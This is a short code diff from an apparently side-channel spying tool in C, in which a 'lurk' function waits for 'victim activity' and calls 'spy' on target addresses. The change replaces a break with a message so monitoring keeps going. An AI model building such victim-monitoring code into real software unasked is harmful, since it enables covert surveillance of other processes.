@@ -206,7 +206,7 @@ void lurk(void *base, char **target_adrs, int adrs_amount)
         {
             printf("Detected victim activity - starting spy\n");
             spy(target_adrs, adrs_amount);
-            break;
+	    printf("Finished monitoring - waiting for victim activity ...");
         }
     }
 }
